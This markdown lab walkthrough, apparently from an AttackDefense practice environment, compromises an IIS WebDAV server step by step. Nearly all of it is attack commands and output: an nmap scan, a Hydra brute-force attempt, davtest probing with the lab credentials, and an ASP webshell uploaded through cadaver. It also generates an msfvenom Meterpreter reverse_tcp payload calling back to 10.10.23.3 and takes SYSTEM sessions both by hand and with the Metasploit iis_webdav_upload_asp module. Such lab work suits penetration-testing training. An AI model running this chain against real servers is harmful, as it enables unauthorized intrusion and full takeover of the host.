# Webdav

## nmap Scan
```bash
root@attackdefense:~# nmap -sV -p 80 --script=http-enum $target
Starting Nmap 7.91 ( https://nmap.org ) at 2024-01-22 16:42 IST
Nmap scan report for 10.4.31.177
Host is up (0.0075s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 10.0
| http-enum:
|_  /webdav/: Potentially interesting folder (401 Unauthorized)
|_http-server-header: Microsoft-IIS/10.0
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 29.27 seconds
```

## Brute Force Users

```bash
root@attackdefense:~# hydra -L /usr/share/wordlists/metasploit/common_users.txt -P /usr/share/wordlists/metasploit/common_passwords.txt $target http-get /webdav/
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-01-22 16:46:51
[DATA] max 16 tasks per 1 server, overall 16 tasks, 400 login tries (l:8/p:50), ~25 tries per task
[DATA] attacking http-get://10.4.31.177:80/webdav/
1 of 1 target completed, 0 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-01-22 16:46:55
```

## davtest - Test for Vulnerabilities

```bash
root@attackdefense:~# davtest -url http://$target/webdav/ -auth bob:password_123321
********************************************************
 Testing DAV connection
OPEN		SUCCEED:		http://10.4.31.177/webdav
********************************************************
NOTE	Random string for this session: jR_65KNWWZ
********************************************************
 Creating directory
MKCOL		SUCCEED:		Created http://10.4.31.177/webdav/DavTestDir_jR_65KNWWZ
********************************************************
 Sending test files
PUT	shtml	SUCCEED:	http://10.4.31.177/webdav/DavTestDir_jR_65KNWWZ/davtest_jR_65KNWWZ.shtml
PUT	html	SUCCEED:	http://10.4.31.177/webdav/DavTestDir_jR_65KNWWZ/davtest_jR_65KNWWZ.html
PUT	pl	SUCCEED:	http://10.4.31.177/webdav/DavTestDir_jR_65KNWWZ/davtest_jR_65KNWWZ.pl
PUT	jsp	SUCCEED:	http://10.4.31.177/webdav/DavTestDir_jR_65KNWWZ/davtest_jR_65KNWWZ.jsp
PUT	php	SUCCEED:	http://10.4.31.177/webdav/DavTestDir_jR_65KNWWZ/davtest_jR_65KNWWZ.php
PUT	txt	SUCCEED:	http://10.4.31.177/webdav/DavTestDir_jR_65KNWWZ/davtest_jR_65KNWWZ.txt
PUT	aspx	SUCCEED:	http://10.4.31.177/webdav/DavTestDir_jR_65KNWWZ/davtest_jR_65KNWWZ.aspx
PUT	jhtml	SUCCEED:	http://10.4.31.177/webdav/DavTestDir_jR_65KNWWZ/davtest_jR_65KNWWZ.jhtml
PUT	cgi	SUCCEED:	http://10.4.31.177/webdav/DavTestDir_jR_65KNWWZ/davtest_jR_65KNWWZ.cgi
PUT	asp	SUCCEED:	http://10.4.31.177/webdav/DavTestDir_jR_65KNWWZ/davtest_jR_65KNWWZ.asp
PUT	cfm	SUCCEED:	http://10.4.31.177/webdav/DavTestDir_jR_65KNWWZ/davtest_jR_65KNWWZ.cfm
********************************************************
 Checking for test file execution
EXEC	shtml	FAIL
EXEC	html	SUCCEED:	http://10.4.31.177/webdav/DavTestDir_jR_65KNWWZ/davtest_jR_65KNWWZ.html
EXEC	pl	FAIL
EXEC	jsp	FAIL
EXEC	php	FAIL
EXEC	txt	SUCCEED:	http://10.4.31.177/webdav/DavTestDir_jR_65KNWWZ/davtest_jR_65KNWWZ.txt
EXEC	aspx	FAIL
EXEC	jhtml	FAIL
EXEC	cgi	FAIL
EXEC	asp	SUCCEED:	http://10.4.31.177/webdav/DavTestDir_jR_65KNWWZ/davtest_jR_65KNWWZ.asp
EXEC	cfm	FAIL

********************************************************
/usr/bin/davtest Summary:
Created: http://10.4.31.177/webdav/DavTestDir_jR_65KNWWZ
PUT File: http://10.4.31.177/webdav/DavTestDir_jR_65KNWWZ/davtest_jR_65KNWWZ.shtml
PUT File: http://10.4.31.177/webdav/DavTestDir_jR_65KNWWZ/davtest_jR_65KNWWZ.html
PUT File: http://10.4.31.177/webdav/DavTestDir_jR_65KNWWZ/davtest_jR_65KNWWZ.pl
PUT File: http://10.4.31.177/webdav/DavTestDir_jR_65KNWWZ/davtest_jR_65KNWWZ.jsp
PUT File: http://10.4.31.177/webdav/DavTestDir_jR_65KNWWZ/davtest_jR_65KNWWZ.php
PUT File: http://10.4.31.177/webdav/DavTestDir_jR_65KNWWZ/davtest_jR_65KNWWZ.txt
PUT File: http://10.4.31.177/webdav/DavTestDir_jR_65KNWWZ/davtest_jR_65KNWWZ.aspx
PUT File: http://10.4.31.177/webdav/DavTestDir_jR_65KNWWZ/davtest_jR_65KNWWZ.jhtml
PUT File: http://10.4.31.177/webdav/DavTestDir_jR_65KNWWZ/davtest_jR_65KNWWZ.cgi
PUT File: http://10.4.31.177/webdav/DavTestDir_jR_65KNWWZ/davtest_jR_65KNWWZ.asp
PUT File: http://10.4.31.177/webdav/DavTestDir_jR_65KNWWZ/davtest_jR_65KNWWZ.cfm
Executes: http://10.4.31.177/webdav/DavTestDir_jR_65KNWWZ/davtest_jR_65KNWWZ.html
Executes: http://10.4.31.177/webdav/DavTestDir_jR_65KNWWZ/davtest_jR_65KNWWZ.txt
Executes: http://10.4.31.177/webdav/DavTestDir_jR_65KNWWZ/davtest_jR_65KNWWZ.asp
```

## cadaver - Exploit

```bash
root@attackdefense:~# cadaver http://$target/webdav
Authentication required for 10.4.31.177 on server `10.4.31.177':
Username: bob
Password:
dav:/webdav/> ls
Listing collection `/webdav/': succeeded.
Coll:   DavTestDir_jR_65KNWWZ                  0  Jan 22 16:49
        AttackDefense.txt                     13  Jan  2  2021
        web.config                           168  Jan  2  2021
dav:/webdav/> help
Available commands:
 ls         cd         pwd        put        get        mget       mput
 edit       less       mkcol      cat        delete     rmcol      copy
 move       lock       unlock     discover   steal      showlocks  version
 checkin    checkout   uncheckout history    label      propnames  chexec
 propget    propdel    propset    search     set        open       close
 echo       quit       unset      lcd        lls        lpwd       logout
 help       describe   about
Aliases: rm=delete, mkdir=mkcol, mv=move, cp=copy, more=less, quit=exit=bye
dav:/webdav/> put /usr/share/webshells/asp/webshell.asp
Uploading /usr/share/webshells/asp/webshell.asp to `/webdav/webshell.asp':
Progress: [=============================>] 100.0% of 1362 bytes succeeded.
```

## Get Reverse Shell

Create Meterpreter Payload
```bash
root@attackdefense:~# msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.23.3 LPORT=1234 -f asp > shell.asp
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 354 bytes
Final size of asp file: 38338 bytes

root@attackdefense:~# ls
Desktop  impacket  shell.asp  thinclient_drives
```

Upload it to the sever

```bash
root@attackdefense:~# cadaver http://10.4.23.220/webdav
Authentication required for 10.4.23.220 on server `10.4.23.220':
Username: bob
Password:

dav:/webdav/> put shell.asp
Uploading shell.asp to `/webdav/shell.asp':
Progress: [=============================>] 100.0% of 38338 bytes succeeded.
```

Start Multihandler, and navigate to uploaded payload

```bash
msf6 > use multi/handler
[*] Using configured payload generic/shell_reverse_tcp

msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp

msf6 exploit(multi/handler) > options

Module options (exploit/multi/handler):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST                      yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target


msf6 exploit(multi/handler) > set LHOST 10.10.23.3
LHOST => 10.10.23.3

msf6 exploit(multi/handler) > set LPORT 1234
LPORT => 1234

msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.10.23.3:1234
[*] Sending stage (175174 bytes) to 10.4.23.220
[*] Meterpreter session 1 opened (10.10.23.3:1234 -> 10.4.23.220:49763) at 2024-01-22 17:54:05 +0530

meterpreter > sysinfo
Computer        : AD-IIS
OS              : Windows 2016+ (10.0 Build 17763).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 2
Meterpreter     : x86/windows

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

### Upload With Metasploit

```bash
msf6 exploit(multi/handler) > use exploit/windows/iis/iis_webdav_upload_asp
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp

msf6 exploit(windows/iis/iis_webdav_upload_asp) > options

Module options (exploit/windows/iis/iis_webdav_upload_asp):

   Name          Current Setting        Required  Description
   ----          ---------------        --------  -----------
   HttpPassword                         no        The HTTP password to specify for authentication
   HttpUsername                         no        The HTTP username to specify for authentication
   METHOD        move                   yes       Move or copy the file on the remote system from .txt -> .asp (Accepted: move, copy)
   PATH          /metasploit%RAND%.asp  yes       The path to attempt to upload
   Proxies                              no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                               yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT         80                     yes       The target port (TCP)
   SSL           false                  no        Negotiate SSL/TLS for outgoing connections
   VHOST                                no        HTTP server virtual host


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.10.23.3       yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic


msf6 exploit(windows/iis/iis_webdav_upload_asp) > set RHOSTS 10.4.23.220
RHOSTS => 10.4.23.220

msf6 exploit(windows/iis/iis_webdav_upload_asp) > set HTTPUSERNAME bob
HTTPUSERNAME => bob

msf6 exploit(windows/iis/iis_webdav_upload_asp) > set HTTPPASSWORD password_123321
HTTPPASSWORD => password_123321

msf6 exploit(windows/iis/iis_webdav_upload_asp) > set PATH /webdav/metasploit.asp
PATH => /webdav/metasploit.asp

msf6 exploit(windows/iis/iis_webdav_upload_asp) > exploit

[*] Started reverse TCP handler on 10.10.23.3:4444
[*] Checking /webdav/metasploit.asp
[*] Uploading 609378 bytes to /webdav/metasploit.txt...
[*] Moving /webdav/metasploit.txt to /webdav/metasploit.asp...
[*] Executing /webdav/metasploit.asp...
[*] Deleting /webdav/metasploit.asp (this doesn't always work)...
[*] Sending stage (175174 bytes) to 10.4.23.220
[*] Meterpreter session 2 opened (10.10.23.3:4444 -> 10.4.23.220:49843) at 2024-01-22 18:19:44 +0530

meterpreter > sysinfo
Computer        : AD-IIS
OS              : Windows 2016+ (10.0 Build 17763).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 2
Meterpreter     : x86/windows

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```